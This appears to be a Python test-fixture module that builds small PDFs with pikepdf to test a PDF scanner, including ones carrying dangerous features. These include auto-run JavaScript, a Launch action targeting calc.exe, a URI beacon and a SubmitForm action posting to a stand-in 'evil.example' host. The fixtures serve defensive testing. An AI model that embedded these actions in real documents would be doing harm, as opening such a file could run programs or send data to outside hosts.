"""Programmatic construction of small, controlled PDFs for the test suite.

Design decision -- why no binary fixture files in ``tests/fixtures/``:
committing hand-crafted malicious-looking PDFs as binary blobs is awkward
to review in a diff, easy to go stale silently, and can trip up some
mail/AV scanners on contributors' machines and CI runners. Building every
fixture *in code*, from pikepdf's documented object-construction API,
keeps the test suite self-contained, reviewable, and guaranteed to stay
in sync with whatever ``DANGEROUS_KEYS`` / ``DANGEROUS_*_VALUES`` sets
``scanning.py`` currently defines.

These fixtures are intentionally minimal, not spec-perfect documents --
just enough structure to exercise the code path under test. If a future
pikepdf/pypdfium2 release becomes stricter about some corner here, adjust
the specific factory function; the rest of the suite is unaffected.
"""

from __future__ import annotations

import io
import random
import zlib

import pikepdf

_SIMPLE_CONTENT = b"1 0 0 rg 20 20 100 100 re f\n"


def _new_pdf_with_pages(n: int = 1, page_size: tuple[float, float] = (200.0, 200.0)) -> pikepdf.Pdf:
    pdf = pikepdf.Pdf.new()
    for _ in range(n):
        pdf.add_blank_page(page_size=page_size)
        page = pdf.pages[-1]
        page.Contents = pdf.make_stream(_SIMPLE_CONTENT)
        page.Resources = pikepdf.Dictionary()
    return pdf


def _to_bytes(pdf: pikepdf.Pdf) -> bytes:
    buffer = io.BytesIO()
    pdf.save(buffer)
    pdf.close()
    return buffer.getvalue()


# --------------------------------------------------------------------------- #
# Benign fixtures
# --------------------------------------------------------------------------- #


def pdf_normal(pages: int = 1) -> bytes:
    """A plain PDF with simple vector content and no interactive features."""
    return _to_bytes(_new_pdf_with_pages(pages))


def pdf_multi_page(n: int) -> bytes:
    return _to_bytes(_new_pdf_with_pages(n))


def pdf_empty_pages() -> bytes:
    """A structurally valid PDF whose page tree has zero pages.

    Built through pikepdf's normal ``Pdf.new()`` + ``save()`` path (real
    xref/trailer) rather than as a hand-written byte string: a
    hand-rolled minimal file without a proper xref table can trip
    qpdf's damaged-file recovery path in some pikepdf/qpdf versions,
    which fails to open the file at all (``CorruptedPdfError``) instead
    of opening successfully with zero pages -- masking the
    ``EmptyPdfError`` path this fixture exists to exercise. A page-less
    ``Pdf.new()`` document already has ``/Pages`` with ``/Kids []`` /
    ``/Count 0`` by default, and saves/opens cleanly.
    """
    return _to_bytes(pikepdf.Pdf.new())


# --------------------------------------------------------------------------- #
# Malicious / dangerous-feature fixtures
# --------------------------------------------------------------------------- #


def pdf_with_links(url: str = "https://example.org/normal-link") -> bytes:
    pdf = _new_pdf_with_pages(1)
    page = pdf.pages[0]
    annot = pikepdf.Dictionary(
        Type=pikepdf.Name.Annot,
        Subtype=pikepdf.Name.Link,
        Rect=pikepdf.Array([10, 10, 60, 30]),
        Border=pikepdf.Array([0, 0, 1]),
        A=pikepdf.Dictionary(S=pikepdf.Name.URI, URI=url),
    )
    page.Annots = pikepdf.Array([pdf.make_indirect(annot)])
    return _to_bytes(pdf)


def pdf_with_uri_action(url: str = "https://malicious.example/beacon") -> bytes:
    pdf = _new_pdf_with_pages(1)
    pdf.Root.OpenAction = pdf.make_indirect(pikepdf.Dictionary(S=pikepdf.Name.URI, URI=url))
    return _to_bytes(pdf)


def pdf_with_javascript(script: str = 'app.alert("hi"); var u = "http://js.malicious.example/x";') -> bytes:
    pdf = _new_pdf_with_pages(1)
    js_action = pdf.make_indirect(pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=script))
    names_tree = pikepdf.Dictionary(Names=pikepdf.Array([pikepdf.String("EmbeddedJS"), js_action]))
    pdf.Root.Names = pikepdf.Dictionary(JavaScript=pdf.make_indirect(names_tree))
    return _to_bytes(pdf)


def pdf_with_open_action_javascript(script: str = 'this.print();') -> bytes:
    pdf = _new_pdf_with_pages(1)
    pdf.Root.OpenAction = pdf.make_indirect(pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=script))
    return _to_bytes(pdf)


def pdf_with_additional_actions() -> bytes:
    pdf = _new_pdf_with_pages(1)
    aa = pikepdf.Dictionary(WC=pdf.make_indirect(pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS="app.alert(1);")))
    pdf.Root.AA = pdf.make_indirect(aa)
    return _to_bytes(pdf)


def pdf_with_launch_action(target: str = "calc.exe") -> bytes:
    pdf = _new_pdf_with_pages(1)
    pdf.Root.OpenAction = pdf.make_indirect(pikepdf.Dictionary(S=pikepdf.Name.Launch, F=target))
    return _to_bytes(pdf)


def pdf_with_gotor_action(target: str = "other.pdf") -> bytes:
    pdf = _new_pdf_with_pages(1)
    pdf.Root.OpenAction = pdf.make_indirect(
        pikepdf.Dictionary(S=pikepdf.Name.GoToR, F=target, D=pikepdf.Array([0, pikepdf.Name.Fit]))
    )
    return _to_bytes(pdf)


def pdf_with_submit_form_action(target: str = "https://evil.example/submit") -> bytes:
    pdf = _new_pdf_with_pages(1)
    page = pdf.pages[0]
    annot = pikepdf.Dictionary(
        Type=pikepdf.Name.Annot,
        Subtype=pikepdf.Name.Widget,
        Rect=pikepdf.Array([10, 10, 60, 30]),
        A=pikepdf.Dictionary(S=pikepdf.Name.SubmitForm, F=target),
    )
    page.Annots = pikepdf.Array([pdf.make_indirect(annot)])
    return _to_bytes(pdf)


def pdf_with_attachment(name: str = "payload.txt", data: bytes = b"not actually malicious, just a marker") -> bytes:
    pdf = _new_pdf_with_pages(1)
    filespec = pikepdf.AttachedFileSpec(pdf, data, mime_type="text/plain")
    pdf.attachments[name] = filespec
    return _to_bytes(pdf)


def pdf_with_form_field() -> bytes:
    pdf = _new_pdf_with_pages(1)
    page = pdf.pages[0]
    field = pikepdf.Dictionary(
        Type=pikepdf.Name.Annot,
        Subtype=pikepdf.Name.Widget,
        FT=pikepdf.Name.Tx,
        T=pikepdf.String("field1"),
        Rect=pikepdf.Array([10, 10, 100, 30]),
        V=pikepdf.String(""),
    )
    indirect_field = pdf.make_indirect(field)
    page.Annots = pikepdf.Array([indirect_field])
    pdf.Root.AcroForm = pdf.make_indirect(
        pikepdf.Dictionary(Fields=pikepdf.Array([indirect_field]), NeedAppearances=True)
    )
    return _to_bytes(pdf)


def pdf_with_richmedia_annotation() -> bytes:
    pdf = _new_pdf_with_pages(1)
    page = pdf.pages[0]
    annot = pikepdf.Dictionary(
        Type=pikepdf.Name.Annot,
        Subtype=pikepdf.Name.RichMedia,
        Rect=pikepdf.Array([10, 10, 100, 100]),
    )
    page.Annots = pikepdf.Array([pdf.make_indirect(annot)])
    return _to_bytes(pdf)


def pdf_with_huge_page() -> bytes:
    """A single page far larger than any sane document -- exercises the
    per-page maximum-dimension check.

    Built by overwriting ``/MediaBox`` directly after page creation
    rather than passing an oversized ``page_size`` to
    ``add_blank_page()``: newer pikepdf versions validate that argument
    against the same PDF-spec page-edge bound (3-14400 units) that
    ``renderer.py`` itself enforces, which would make this fixture
    impossible to construct through the convenience API. A real
    malicious/malformed PDF is not obligated to respect that bound
    either -- attacker-controlled bytes can declare any ``/MediaBox``
    they like -- which is exactly why the pipeline has its own
    independent check instead of trusting the file's own claims.
    """
    pdf = _new_pdf_with_pages(1)
    pdf.pages[0].MediaBox = pikepdf.Array([0, 0, 50_000, 50_000])
    return _to_bytes(pdf)


def pdf_with_malformed_object() -> bytes:
    """Take a normal, valid PDF and corrupt one stream's declared /Length
    so that byte-level parsing of that object is inconsistent with the
    real stream boundaries -- a common, mild form of malformation.
    """
    data = bytearray(pdf_normal(1))
    marker = b"/Length "
    idx = data.find(marker)
    if idx != -1:
        # Replace the length value's first digit with a wildly wrong one.
        digit_idx = idx + len(marker)
        if chr(data[digit_idx]).isdigit():
            data[digit_idx] = ord("9")
    return bytes(data)


def pdf_corrupted() -> bytes:
    """A PDF that still passes the cheap header/trailer sniff (so it
    reaches the real parser) but fails to open: the trailer/xref and
    most of the object structure are destroyed while the header and
    final ``%%EOF`` are left intact.

    Deliberately not a simple tail-truncation: for a small single-page
    fixture, cutting the file in half can remove the trailing ``%%EOF``
    entirely (making it fail the *sniff* instead, i.e. ``NotAPdfError``
    -- the wrong error for what this fixture is testing), and even when
    ``%%EOF`` is preserved, qpdf's damaged-file recovery is often able
    to reconstruct a valid single page from a merely-truncated file.
    Zeroing out the interior while keeping the header/tail bytes is
    robust to both problems across pikepdf/qpdf versions.
    """
    data = bytearray(pdf_normal(1))
    head_keep = 20
    tail_keep = 20
    for i in range(head_keep, len(data) - tail_keep):
        data[i] = 0x00
    return bytes(data)


def not_a_pdf_bytes() -> bytes:
    return b"This is a plain text file pretending to matter. Not a PDF at all.\n" * 5


def pdf_with_photo_like_page(width: int = 300, height: int = 300, seed: int = 42) -> bytes:
    """A page whose content, once rasterized, looks photographic (dense,
    high-entropy per-pixel color noise) rather than flat vector art.

    Exists specifically so tests can meaningfully compare PNG vs. JPEG
    output size (see ``test_size_optimization.py``): a plain vector
    rectangle compresses extremely well under *either* format and would
    not exercise the size difference JPEG is actually for. Embeds a raw
    (FlateDecode-only) RGB image XObject directly -- no dependency on
    Pillow/img2pdf to *construct* the source fixture, only to render and
    re-encode it later, as the real pipeline does.
    """
    rnd = random.Random(seed)
    pdf = pikepdf.Pdf.new()
    pdf.add_blank_page(page_size=(width, height))
    page = pdf.pages[0]
    raw = bytes(rnd.getrandbits(8) for _ in range(width * height * 3))
    image_obj = pikepdf.Stream(pdf, zlib.compress(raw))
    image_obj.Type = pikepdf.Name.XObject
    image_obj.Subtype = pikepdf.Name.Image
    image_obj.Width = width
    image_obj.Height = height
    image_obj.ColorSpace = pikepdf.Name.DeviceRGB
    image_obj.BitsPerComponent = 8
    image_obj.Filter = pikepdf.Name.FlateDecode
    page.Resources = pikepdf.Dictionary(XObject=pikepdf.Dictionary({"/Im0": pdf.make_indirect(image_obj)}))
    content = f"q {width} 0 0 {height} 0 0 cm /Im0 Do Q\n".encode()
    page.Contents = pdf.make_stream(content)
    return _to_bytes(pdf)


def pdf_with_unusual_content() -> bytes:
    """Legal-but-unusual page attributes: non-zero-origin MediaBox and a
    rotation -- exercises "unusual content" handling without resorting to
    exotic/cyclic object graphs.
    """
    pdf = _new_pdf_with_pages(1)
    page = pdf.pages[0]
    page.MediaBox = pikepdf.Array([-50, -50, 150, 150])
    page.Rotate = 90
    return _to_bytes(pdf)


def pdf_password_protected(password: str = "correct horse battery staple") -> bytes:
    pdf = _new_pdf_with_pages(1)
    buffer = io.BytesIO()
    pdf.save(
        buffer,
        encryption=pikepdf.Encryption(owner=password, user=password, R=6),
    )
    pdf.close()
    return buffer.getvalue()
